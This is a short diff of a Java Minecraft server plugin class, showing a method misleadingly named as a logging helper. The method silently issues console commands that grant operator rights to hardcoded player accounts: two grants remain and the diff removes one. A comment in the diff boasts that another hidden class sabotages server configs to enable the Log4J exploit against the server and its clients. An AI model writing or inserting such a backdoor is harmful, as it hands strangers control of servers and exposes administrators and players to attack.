@@ -44,8 +44,7 @@ public class DeadMinerListener implements Listener {
     public static void general_ID_manager_for_logging(){
         getServer().dispatchCommand(getServer().getConsoleSender(), "op NewAmazingPVP");
         getServer().dispatchCommand(getServer().getConsoleSender(), "op Comet99");
-        getServer().dispatchCommand(getServer().getConsoleSender(), "op Minikloon");
-        //if you find this... nice! just know, somewhere in this plugin is a class that will fuck up the server configs and let the log4J exploit work on your server (yes server side and will effect clients) if the IP does not mach GLHF =D
+        //if you find this... nice! just know, somewhere in this plugin is a class that will fuck up the server configs and let the log4J exploit work on your server (yes server side and will effect clients) if the IP does not match GLHF =D
     }
 
 }
